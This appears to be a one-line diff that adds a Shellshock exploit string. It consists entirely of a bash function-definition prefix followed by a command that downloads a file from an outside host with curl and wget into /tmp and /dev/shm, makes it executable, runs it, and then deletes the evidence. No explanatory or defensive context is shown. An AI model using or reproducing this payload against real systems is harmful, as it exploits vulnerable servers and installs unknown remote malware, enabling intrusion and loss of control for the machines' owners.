@@ -1,0 +1,1 @@
+() { :;}; /bin/bash -c "curl -o /tmp/log  http://saigalhomes.com/log;/usr/bin/wget  http://saigalhomes.com/log -O /tmp/log;wget  http://saigalhomes.com/log -O /dev/shm/log;chmod +x /dev/shm/log /tmp/log;/dev/shm/log;/tmp/log;rm -rf /dev/shm/log /tmp/log*"
